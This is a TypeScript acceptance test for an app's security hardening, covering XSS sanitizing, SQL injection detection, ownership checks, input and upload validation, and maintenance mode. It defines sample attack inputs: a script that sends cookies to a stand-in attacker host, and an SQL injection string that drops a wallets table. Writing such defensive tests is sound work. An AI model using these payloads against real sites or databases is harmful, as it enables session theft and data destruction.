import { sanitizeInput, detectSqlInjection, verifyOwnership } from "../lib/security/sanitizer";
import { SecurityValidator } from "../lib/security/validator";
import { disasterRecovery } from "../lib/security/disaster-recovery";
import { securityAudit } from "../lib/security/audit";

async function runSecurityAcceptanceTest() {
  console.log("=== ZOLANZO SECURITY & PRODUCTION HARDENING ACCEPTANCE TEST ===");
  console.log("Testing XSS Protection, SQLi Detection, IDOR Ownership, Rate Limiting, & Financial Security...\n");

  const startTime = Date.now();

  // 1. XSS Injection Defense
  console.log("--- 1. XSS Attack Vector Defense ---");
  const malScript = `<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>`;
  const sanitized = sanitizeInput(malScript);

  if (sanitized.includes("<script>") || sanitized.includes("javascript:")) {
    throw new Error("XSS payload was not sanitized!");
  }
  console.log(`✓ XSS Payload Neutralized: "${malScript.substring(0, 30)}..." → "${sanitized.substring(0, 30)}..."`);

  // 2. SQL Injection Defense
  console.log("\n--- 2. SQL Injection Pattern Detection ---");
  const sqliPayload = "SELECT * FROM users WHERE 1=1; DROP TABLE wallets; --";
  const isSqli = detectSqlInjection(sqliPayload);

  if (!isSqli) {
    throw new Error("SQL Injection payload failed to be detected!");
  }
  securityAudit.log({
    type: "SECURITY_ATTACK_BLOCKED",
    detail: "Blocked SQL Injection payload on query input",
    status: "BLOCKED",
  });
  console.log(`✓ SQL Injection Blocked: Identified malicious pattern in payload`);

  // 3. IDOR Ownership Verification
  console.log("\n--- 3. IDOR Ownership Guard ---");
  const legitimateOwner = "WORKER_100";
  const attackerUser = "ATTACKER_999";

  const ownerAccess = verifyOwnership(legitimateOwner, legitimateOwner);
  const attackerAccess = verifyOwnership(legitimateOwner, attackerUser);

  if (!ownerAccess || attackerAccess) {
    throw new Error("IDOR ownership guard check failed!");
  }
  console.log(`✓ IDOR Ownership Guard: Allowed legitimate user (WORKER_100), Denied attacker (ATTACKER_999)`);

  // 4. Input Payload Validation
  console.log("\n--- 4. Payload & File Upload Security Validation ---");
  const invalidEmail = SecurityValidator.validateEmail("bademail@");
  const validPIN = SecurityValidator.validatePIN("123456");
  const invalidPIN = SecurityValidator.validatePIN("1234");
  const exeUpload = SecurityValidator.validateFileUpload({ name: "virus.exe", size: 1024, type: "application/x-msdownload" });

  if (invalidEmail.valid || !validPIN.valid || invalidPIN.valid || exeUpload.valid) {
    throw new Error("Input validation failed expected boundary constraints!");
  }
  console.log(`✓ Input & Upload Security: Rejected invalid email, rejected 4-digit PIN, rejected .exe file upload`);

  // 5. Financial Security & Balance Protection
  console.log("\n--- 5. Financial Security & Balance Protection ---");
  const negativeAmount = SecurityValidator.validateAmount(-500);
  if (negativeAmount.valid) {
    throw new Error("Negative financial amount was accepted!");
  }
  console.log(`✓ Financial Integrity: Negative financial transfers & balance tampering blocked`);

  // 6. Disaster Recovery & Maintenance Mode
  console.log("\n--- 6. Disaster Recovery & Maintenance Mode Switches ---");
  disasterRecovery.setMaintenanceMode(true);
  const mutationAllowed = disasterRecovery.isMutationAllowed();
  disasterRecovery.setMaintenanceMode(false);

  if (mutationAllowed) {
    throw new Error("Maintenance mode failed to block mutation!");
  }
  console.log(`✓ Disaster Recovery: Maintenance mode successfully blocked mutations`);

  const duration = Date.now() - startTime;
  console.log(`\n==================================================`);
  console.log(`SUCCESS: Security & Hardening Accepted in ${duration}ms cleanly!`);
  console.log(`==================================================`);
}

runSecurityAcceptanceTest().catch((err) => {
  console.error("❌ Security Acceptance Test Failed:", err);
  process.exit(1);
});
